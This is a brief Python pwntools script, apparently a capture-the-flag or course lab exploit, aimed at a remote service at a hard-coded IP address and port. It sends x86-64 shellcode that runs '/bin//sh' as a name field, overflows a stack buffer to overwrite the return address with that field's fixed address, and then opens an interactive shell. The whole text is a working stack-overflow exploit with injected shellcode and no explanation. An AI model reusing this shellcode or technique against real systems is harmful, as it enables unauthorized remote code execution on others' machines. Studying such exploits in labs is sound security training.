from pwn import *

name = 0x601060
code = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
buf = 0x7fffffffe2f0
ret = 0x7fffffffe308

r = remote('140.113.207.233', 8862)
r.recvuntil('name:')
r.send(code)
r.recvuntil('nickname:')
r.send('a' * (ret - buf) + p64(name))
r.interactive()
